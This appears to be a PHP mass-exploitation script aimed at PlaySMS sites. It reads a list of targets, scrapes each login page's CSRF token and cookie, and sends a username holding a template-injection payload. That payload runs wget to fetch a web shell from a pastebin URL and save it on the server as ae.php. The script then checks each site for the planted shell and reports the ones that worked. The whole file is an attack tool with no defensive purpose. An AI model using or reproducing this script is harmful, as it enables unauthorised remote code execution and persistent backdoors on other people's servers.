<?php
/**
 * @WibuHeker | PlaySMS Auto Upload Shell
 */
require_once 'Curl.php';

enterlist:
$listname = readline("Enter list : ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] list not found".PHP_EOL;
	goto enterlist;
}

$lists = explode("\n", str_replace("\r", "", file_get_contents($listname)));
foreach ($lists as $site) {
    $curl = new Curl();
    $curl->URL = $site . "/index.php";
    $curl->GET();
    if ($curl->Response()->status_code === 302) {
        $urlStore = $site . "/" . $curl->Response()->headers->location;
        $curl->URL = $urlStore;
        $curl->GET();
        if (preg_match('/name="X-CSRF-Token"/', $curl->Response()->body)) {
            preg_match_all('/name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/', $curl->Response()->body, $match, PREG_SET_ORDER, 0);
            $csrf = $match[0]['csrf'];
            $cookie = $curl->Response()->headers->set_cookie;
            $curl->URL = $urlStore;
            $curl->SetHeaders(
                array(
                    "Cookie: {$cookie}"
                )
            );
            $curl->Follow();
            $curl->POST("X-CSRF-Token={$csrf}&username={{`wget https://pastebin.com/raw/CUc4w3hc -O ae.php`}}&password=");
            if ($curl->Response()->status_code === 200) {
                $curl->URL = $site . "/ae.php";
                $curl->GET();
                if (preg_match('/azzatssins/', $curl->Response()->body)) {
                    echo $site . "/ae.php -> SHELL" . PHP_EOL;
                } else {
                    echo $site . " Failed Upload Shell" . PHP_EOL;
                }
            } else {
                echo $site . " Unknow Error! Cant execute command!" . PHP_EOL;
            }
        } else {
            echo $urlStore . " -> Cannot retrive CSRF TOKEN!" . PHP_EOL;
        }
    }
}
